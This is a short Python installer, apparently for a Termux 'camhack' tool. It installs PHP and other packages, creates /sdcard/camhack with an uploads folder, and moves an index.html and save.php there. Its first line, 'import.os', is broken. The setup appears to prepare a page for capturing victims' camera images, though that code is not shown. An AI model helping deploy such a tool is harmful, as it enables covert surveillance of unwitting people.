import.os
tgreen = '\033[32m'
print( tgreen + "installing dependencies")
os.system("apt install cowsay")
os.system("apt install wget")
os.system("apt install unzip")
os.system("apt install php")
os.system("termux-setup-storage")
os.system("mkdir /sdcard/camhack")
os.system("mv index.html /sdcard/camhack && mv save.php /sdcard/camhack")
os.system("mkdir /sdcard/camhack/uploads")
os.system("chmod +x startup.py")
print(" ")
print("Now start the tool by using command python2 startup.py ")